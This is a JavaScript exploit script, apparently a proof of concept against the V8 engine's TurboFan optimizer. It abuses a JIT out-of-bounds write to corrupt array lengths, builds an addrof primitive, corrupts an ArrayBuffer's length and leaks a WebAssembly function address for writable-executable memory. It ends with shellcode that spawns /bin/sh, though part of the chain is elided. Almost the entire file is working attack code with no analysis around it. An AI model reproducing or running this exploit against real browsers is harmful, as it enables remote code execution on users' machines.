// Helper functions
let f64 = new Float64Array(1);
let u32 = new Uint32Array(f64.buffer);

// double to 2x unsigned int32
function d2u(v) {
  f64[0] = v;
  return u32;
}

// 2x unsigned int32 to double 
function u2d(lo, hi) {
  u32[0] = lo;
  u32[1] = hi;
  return f64[0];
}

// 2x unsigned int32 to hex
function hex(lo, hi) {
  if( lo == 0 ) {
    return ("0x" + hi.toString(16) + "00000000");
  }
  if( hi == 0 ) {
    return ("0x" + lo.toString(16));
  }
  return ("0x" + ('00000000'+hi.toString(16)).substr(8) +('00000000'+lo.toString(16)).substr(8));
}

// function which we optimizte with TurboFan
function opt(arg) {
  let x = arguments.length >> 16;

	// inital oob array
  array = new Array(1);
	array[0] = 1.1;

	// grants us unlimited oob access
	array_oob = new Array(2);
	array_oob[0] = 0.4;
	array_oob[1] = 0.5;

	// used for addrof()
	victim = new Array(1);
	victim[0] = {marker: u2d(0, 0x41414141), obj: {}};

	// corrupt length of array_oob
	// now we have unlimited oob access through array_oob
  array[x * 12] = u2d(0, 0x00002000); // 0x00002000

}

// global arrays for oob
var array;
var array_oob;
var victim;

// args for optimization
let small = [1.1];
let large = [];
large.length = 65536;
large.fill(1.1);

console.log("[1] start optimization");

// optimization starts here
for (let i = 0; i < 100000; i++) {
	opt.apply(null, small);
}

// trigger oob
opt.apply(null, large);

console.log("[2] corrupt length of array_oob: " + array_oob.length);

// takes an object and returns a memory address as double
function addrof(obj) {
	victim[0].obj = obj;
	return array_oob[index_obj];
}

// web assembly stuff
let wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 7, 1, 96, 2, 127, 127, 1, 127, 3, 2, 1, 0, 4, 4, 1,
112, 0, 0, 5, 3, 1, 0, 1, 7, 21, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 8, 95, 90, 51, 97, 100, 100, 105, 105,
0, 0, 10, 9, 1, 7, 0, 32, 1, 32, 0, 106, 11]);
let wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), {});
let wasm_fn = wasm_mod.exports._Z3addii;

// rwx memory
let buffer = new ArrayBuffer(0x99);

var index_obj = 0; // index to obj on which we can leak addr
var index_buffer = 0; // index to buffer on which we can lead addr
for (let i = 0; i < 0x2000; i++) {
	if (array_oob[i] == u2d(0, 0x41414141)) { // find marker and
		index_obj = i + 1; // find index to transparent obj
		console.log("[3] find index of transparent obj: " + index_obj);
}

	if (array_oob[i] === u2d(0x99, 0)) { // find arraybuffer length
		array_oob[i] = u2d(0x11111, 0); // corrupt length
		console.log("[4] corrupt length of: " + buffer.byteLength);
		index_buffer = i + 1; // get index to rwx mem
		console.log("[5] find index of rwx buffer: " + index_buffer);
		break;
	}
}

let wasm_fn_addr = addrof(wasm_fn); // find address of wasm function
let lo = d2u(wasm_fn_addr)[0]; 
let hi = d2u(wasm_fn_addr)[1]; 
console.log("[6] find wasm function addr: " + hex(lo, hi));
array_oob[index_buffer] = u2d(lo - 1, hi); // store within rwx

let dv = new DataView(buffer);

// ......

var shellcode = [0x4831f656, 0x48bf2f62, 0x696e2f2f, 0x73685754, 0x576a3b58, 0x990f05]; // start /bin/sh
